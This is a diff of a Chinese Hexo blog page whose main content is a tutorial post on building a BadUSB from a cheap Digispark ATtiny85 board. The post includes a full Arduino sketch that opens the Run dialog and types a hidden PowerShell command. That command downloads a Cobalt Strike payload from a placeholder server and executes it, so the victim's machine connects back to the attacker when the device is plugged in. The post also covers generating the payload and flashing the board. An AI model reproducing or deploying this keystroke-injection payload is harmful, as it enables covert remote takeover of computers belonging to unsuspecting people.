@@ -6,7 +6,7 @@
     <meta name="referrer" content="origin">
     <meta http-equiv="Cache-Control" content="no-transform">
     <meta http-equiv="Cache-Control" content="no-siteapp">
-    <title>Hexo</title>
+    <title>badusb之cs上线</title>
 
     <link type="text/css" rel="stylesheet" href="https://cdn.jsdelivr.net/gh/first19326/cdn@master/static/font/LongCang.css">
     <link type="text/css" rel="stylesheet" href="https://cdn.jsdelivr.net/gh/first19326/cdn@master/static/font/Monda.css">
@@ -17,186 +17,120 @@
     <link type="text/css" rel="stylesheet" href="https://cdn.jsdelivr.net/gh/first19326/cdn@master/static/font/Rosario.css">
     <link type="text/css" rel="stylesheet" href="https://cdn.jsdelivr.net/gh/first19326/cdn@master/static/font/UbuntuMono.css">
 
-    <link type="text/css" rel="stylesheet" href="https://cdn.jsdelivr.net/gh/first19326/cdn@master/static/css/index.css">
+    <link type="text/css" rel="stylesheet" href="https://cdn.jsdelivr.net/gh/first19326/cdn@master/static/css/post.css">
+    
+        <link type="text/css" rel="stylesheet" href="https://cdn.jsdelivr.net/gh/first19326/cdn@master/static/css/normal.css">
+    
 
     <script type="text/javascript" src="https://cdn.jsdelivr.net/gh/first19326/cdn@master/static/js/jquery-3.4.1.min.js"></script>
+
 <meta name="generator" content="Hexo 5.4.0"></head>
 <body>
     <a id="cover"></a>
     <div id="header">
-    <div class="header" >
+    <div class="header">
         <div class="vertical">
             <div class="inner">
-                <h1 class="header-title"></h1>
-                <h2 class="header-description" id="hitokoto"></h2>
-                <h3 class="header-info" id="hitokotoAuthor"></h3>
-                <!--
-                <h1 class="header-subtitle"></h1>
-                <p class="header-subinfo"></p>
-                -->
+                <h1 class="header-subtitle">badusb之cs上线</h1>
+                <div class="header-subinfo">
+                    <p class="article-info-text">
+                        <span>
+                            <i class="iconfont icon-time"></i> 发表时间：2021-08-29
+                        </span>
+                        
+                            <span id="/2021/08/29/badusb/" class="leancloud_visitors" data-flag-title="badusb之cs上线">
+                                <i class="iconfont icon-browse"></i> 阅读：<sapn class="leancloud-visitors-count"></span>
+                            </span>
+                        
+                        <span>
+                            <i class="iconfont icon-interactive"></i> 评论：<span class="valine-comment-count" data-xid="/2021/08/29/badusb/"></span>
+                        </span>  
+                    </p>                 
+                </div>
             </div>
         </div>
-        <a class="scroll-down" href="javascript:;" target="_self" data-offset="-45">
-            <span class="hidden">Scroll Down</span>
-            <i class="scroll-down-icon iconfont icon-return"></i>
-        </a>
+        <canvas id="articleHeaderCanvas"></canvas>
     </div>
 </div>
     <div id="container">
     <div id="content">
-        <div class="articles">
-    
-        <div class="article">
-            <div class="article-title">
-                <a href="/2021/08/29/badusb/">badusb之cs上线</a>
-                
+        <div id="article">
+    <div class="toc"></div>
+    <div class="article-body">
+        <p>#如何花最少的钱造一个橡皮鸭上线CS</p>
+<p>0x00 </p>
+<p>工具：Attiny85芯片，电商平台随便买个 大概9块钱，大概是这个样子的。想要好看，可以自己套个u盘外壳</p>
+<p><img src="/img/badusb1/image-20210829174451882.png" alt="img"></p>
+<p>开发平台：arduino ide。这个平台有下载地址和介绍安装<a target="_blank" rel="noopener" href="https://www.bilibili.com/read/cv7095826/">https://www.bilibili.com/read/cv7095826/</a>  但是我测试了很多遍一直不行，后来安装了驱动就可以了,驱动的下载地址<a target="_blank" rel="noopener" href="https://github.com/digistump/DigistumpArduino/releases/download/1.6.7/Digistump.Drivers.zip">https://github.com/digistump/DigistumpArduino/releases/download/1.6.7/Digistump.Drivers.zip</a> 解压后直接安装就可以了</p>
+<p>0x01 </p>
+<p>首先生成用cs生成一个powershell的payload，上传到服务器，比如服务器的地址是 <a target="_blank" rel="noopener" href="http://x.x.x.x./payload.ps1">http://x.x.x.x./payload.ps1</a></p>
+<p>0x02 </p>
+<p>打开arduino ide  工具选择找到 Digispark  16.5mhz的开发板，这里要提示下，由于按照上面的安装过程，所以已经有了这个开发板，所以不需要更新库来找。</p>
+<p><img src="/img/badusb1/image-20210829175313724.png" alt="img"></p>
+<p>这是插入直接运行 powershell代码</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;DigiKeyboard.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">setup</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  DigiKeyboard.delay(<span class="number">600</span>);</span><br><span class="line">  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);</span><br><span class="line">  DigiKeyboard.delay(<span class="number">300</span>);</span><br><span class="line">  DigiKeyboard.println(<span class="string">&quot;powershell.exe -nop -w hidden -c \&quot;IEX ((new-object net.webclient).downloadstring(\&#x27;http://x.x.x.x/ps.ps1\&#x27;))\&quot;&quot;</span>);</span><br><span class="line">  DigiKeyboard.sendKeyStroke(KEY_ENTER);</span><br><span class="line">  DigiKeyboard.println(<span class="string">&quot;exit&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">loop</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>0x03 插入你买的开发板</p>
+<p><img src="/img/badusb1/image-20210829175604443.png" alt="img"></p>
+<p>直接上传到</p>
+<p><img src="/img/badusb1/image-20210829175650111.png" alt="img"></p>
+<p>他会提示你 请在60秒内再次插入开发板</p>
+<p><img src="/img/badusb1/image-20210829175721008.png" alt="img"></p>
+<p>然后提醒出现Thank you的时候表明已经烧录制成功</p>
+<p>0x04</p>
+<p>我们打开cs ，并同时插入已经录制好的badusb，发现上线了cs</p>
+<p><img src="/img/badusb1/image-20210829175931050.png" alt="img"></p>
+<p>0x05 </p>
+<p>最后说明 大家要去官网看看语法,测试了一下午，没去了解，后来看了官网才发现，语法写错了，真的是罪过啊。</p>
+
+        <p class="suffix-end">__END__</p>
+        <div class="suffix-box">
+            <div class="suffix-box-left">
+                <img src="https://cdn.jsdelivr.net/gh/first19326/cdn@master/static/image/sidebar/avatar.jpg" alt="By Raphale">
             </div>
-            <div class="article-abstract">
-                
+            <div class="suffix-box-right">
+                <span class="suffix-box-title">文章作者</span>：By Raphale
+                <br>
+                <span class="suffix-box-title">文章出处</span>：<a href="/2021/08/29/badusb/" target="_blank">badusb之cs上线</a>
+                <br>
+                <span class="suffix-box-title">作者签名</span>：简单地活着, 肆意又精彩.
+                <br>
+                <span class="suffix-box-title">关于主题</span>：<a href="https://github.com/first19326/Hexo-LiveForCode" target="_blank">Hexo - Live For Code</a>
+                <br>
+                <span class="suffix-box-title">版权声明</span>：文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-nd/4.0/" title="BY-NC-SA" target="_blank">BY-NC-SA</a> 许可协议，转载请注明出处
+                <br>
             </div>
-            <div class="clear"></div>
-            <div class="article-info">
-                <span>
-                    <i class="iconfont icon-time"></i> 发表时间：2021-08-29
-                </span>
-                
-                    <span id="/2021/08/29/badusb/" class="leancloud_visitors" data-flag-title="badusb之cs上线">
-                        <i class="iconfont icon-browse"></i> 阅读：<sapn class="leancloud-visitors-count"></span>
-                    </span>
-                
-                <span>
-                    <i class="iconfont icon-interactive"></i> 评论：<span class="valine-comment-count" data-xid="/2021/08/29/badusb/"></span>
-                </span>
-            </div>
-            <div class="clear"></div>     
+            <div style="clear: both;"></div>
         </div>
-    
-        <div class="article">
-            <div class="article-title">
-                <a href="/2021/08/13/cs-git/">cs系列免杀☞github_poc</a>
+    </div>
+    <div class="article-footer">
+        
+            <div class="category">
+                分类：
+                
+                    <a href="/categories/%E7%A8%80%E5%A5%87%E5%8F%A4%E6%80%AA%E7%B1%BB%E5%9E%8B/">稀奇古怪类型</a>
                 
             </div>
-            <div class="article-abstract">
-                
-            </div>
-            <div class="clear"></div>
-            <div class="article-info">
-                <span>
-                    <i class="iconfont icon-time"></i> 发表时间：2021-08-13
-                </span>
-                
-                    <span id="/2021/08/13/cs-git/" class="leancloud_visitors" data-flag-title="cs系列免杀☞github_poc">
-                        <i class="iconfont icon-browse"></i> 阅读：<sapn class="leancloud-visitors-count"></span>
-                    </span>
-                
-                <span>
-                    <i class="iconfont icon-interactive"></i> 评论：<span class="valine-comment-count" data-xid="/2021/08/13/cs-git/"></span>
-                </span>
-            </div>
-            <div class="clear"></div>     
+        
+        
+        <div class="article-prev-next">
+            
+            
+                <a href="/2021/08/13/cs-git/" class="next-prefix">» </a> 下一篇：    <a href="/2021/08/13/cs-git/" title="发布于 2021-08-13 06:27">cs系列免杀☞github_poc</a>
+            
         </div>
+    </div>
     
-        <div class="article">
-            <div class="article-title">
-                <a href="/2021/08/12/Cs-Two/">CS二开学习记录☞反编译</a>
-                
-            </div>
-            <div class="article-abstract">
-                
-            </div>
-            <div class="clear"></div>
-            <div class="article-info">
-                <span>
-                    <i class="iconfont icon-time"></i> 发表时间：2021-08-12
-                </span>
-                
-                    <span id="/2021/08/12/Cs-Two/" class="leancloud_visitors" data-flag-title="CS二开学习记录☞反编译">
-                        <i class="iconfont icon-browse"></i> 阅读：<sapn class="leancloud-visitors-count"></span>
-                    </span>
-                
-                <span>
-                    <i class="iconfont icon-interactive"></i> 评论：<span class="valine-comment-count" data-xid="/2021/08/12/Cs-Two/"></span>
-                </span>
-            </div>
-            <div class="clear"></div>     
+    <div class="article-comments">
+        <div class="comments-title">
+            评论列表
         </div>
-    
-        <div class="article">
-            <div class="article-title">
-                <a href="/2021/08/09/cs2/">cs系列免杀 二</a>
-                
-            </div>
-            <div class="article-abstract">
-                
-            </div>
-            <div class="clear"></div>
-            <div class="article-info">
-                <span>
-                    <i class="iconfont icon-time"></i> 发表时间：2021-08-09
-                </span>
-                
-                    <span id="/2021/08/09/cs2/" class="leancloud_visitors" data-flag-title="cs系列免杀 二">
-                        <i class="iconfont icon-browse"></i> 阅读：<sapn class="leancloud-visitors-count"></span>
-                    </span>
-                
-                <span>
-                    <i class="iconfont icon-interactive"></i> 评论：<span class="valine-comment-count" data-xid="/2021/08/09/cs2/"></span>
-                </span>
-            </div>
-            <div class="clear"></div>     
+        <div class="comments-content">
         </div>
-    
-        <div class="article">
-            <div class="article-title">
-                <a href="/2021/08/06/cs-1/">cs系列免杀 一</a>
-                
-            </div>
-            <div class="article-abstract">
-                
-            </div>
-            <div class="clear"></div>
-            <div class="article-info">
-                <span>
-                    <i class="iconfont icon-time"></i> 发表时间：2021-08-06
-                </span>
-                
-                    <span id="/2021/08/06/cs-1/" class="leancloud_visitors" data-flag-title="cs系列免杀 一">
-                        <i class="iconfont icon-browse"></i> 阅读：<sapn class="leancloud-visitors-count"></span>
-                    </span>
-                
-                <span>
-                    <i class="iconfont icon-interactive"></i> 评论：<span class="valine-comment-count" data-xid="/2021/08/06/cs-1/"></span>
-                </span>
-            </div>
-            <div class="clear"></div>     
-        </div>
-    
-        <div class="article">
-            <div class="article-title">
-                <a href="/2021/07/30/c/">c#练习记录</a>
-                
-            </div>
-            <div class="article-abstract">
-                
-            </div>
-            <div class="clear"></div>
-            <div class="article-info">
-                <span>
-                    <i class="iconfont icon-time"></i> 发表时间：2021-07-30
-                </span>
-                
-                    <span id="/2021/07/30/c/" class="leancloud_visitors" data-flag-title="c#练习记录">
-                        <i class="iconfont icon-browse"></i> 阅读：<sapn class="leancloud-visitors-count"></span>
-                    </span>
-                
-                <span>
-                    <i class="iconfont icon-interactive"></i> 评论：<span class="valine-comment-count" data-xid="/2021/07/30/c/"></span>
-                </span>
-            </div>
-            <div class="clear"></div>     
-        </div>
-    
-    
+    </div>
+
 </div>
 
     </div>
